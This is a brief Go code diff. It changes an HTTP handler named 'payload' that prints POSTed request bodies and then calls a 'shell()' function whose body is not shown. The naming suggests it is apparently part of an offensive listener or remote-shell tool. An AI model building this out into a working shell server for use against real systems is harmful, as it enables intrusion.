@@ -15,9 +15,8 @@ func main() {
 func payload(w http.ResponseWriter, r *http.Request) {
 	if r.Method == "POST" {
 		result, _ := ioutil.ReadAll(r.Body)
-		r.Body.Close()
 		fmt.Printf("%s\n", result)
-		go shell()
+		shell()
 	}
 }
 func shell() {
